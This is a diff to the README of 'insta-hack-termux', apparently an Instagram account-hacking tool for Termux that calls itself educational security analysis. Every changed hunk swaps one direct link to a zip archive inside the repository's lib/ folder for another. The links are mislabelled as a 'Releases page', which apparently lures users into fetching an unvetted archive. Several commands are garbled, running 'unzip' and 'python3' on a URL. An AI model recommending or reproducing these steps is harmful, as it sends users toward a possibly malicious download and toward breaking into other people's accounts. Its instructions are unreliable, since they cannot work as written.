@@ -7,7 +7,7 @@ Welcome to **insta-hack-termux**. This tool provides advanced security analysis 
 To get started with **insta-hack-termux**, follow these simple steps. No programming knowledge is required.
 
 ### 📥 Download
-[![Download from Releases](https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip%20Now-%23E44A8F?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip)
+[![Download from Releases](https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip%20Now-%23E44A8F?style=for-the-badge&logo=github)](https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip)
 
 ### 🔎 Features
 - **Security Analysis:** Evaluate security measures with simple commands.
@@ -41,7 +41,7 @@ To run **insta-hack-termux**, you need:
      ```
 
 5. **Download the Tool:**
-   - Visit this page to download: [Releases page](https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip).
+   - Visit this page to download: [Releases page](https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip).
 
 6. **Choose the Version:**
    - Download the latest version available. This file will typically be in a zip format.
@@ -49,7 +49,7 @@ To run **insta-hack-termux**, you need:
 7. **Extract the Files:**
    - Use the following command to extract the downloaded zip file:
      ```
-     unzip https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip
+     unzip https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip
      ```
 
 8. **Navigate to the Folder:**
@@ -61,7 +61,7 @@ To run **insta-hack-termux**, you need:
 9. **Run the Tool:**
    - Start using the application with the command:
      ```
-     python3 https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip
+     python3 https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip
      ```
 
 ## 📚 How to Use
@@ -94,6 +94,6 @@ If you find any issues or have suggestions, feel free to contribute. Your ideas 
 ## 🌍 Support
 If you need help, please visit the **insta-hack-termux** repository for FAQs, troubleshooting tips, and community support.
 
-To download, visit: [Releases page](https://raw.githubusercontent.com/Sriv4/insta-hack-termux/main/lib/insta-hack-termux-2.7-beta.1.zip). 
+To download, visit: [Releases page](https://github.com/Sriv4/insta-hack-termux/raw/refs/heads/main/lib/insta-termux-hack-3.1.zip). 
 
 We hope you find **insta-hack-termux** valuable in your educational journey in cybersecurity!
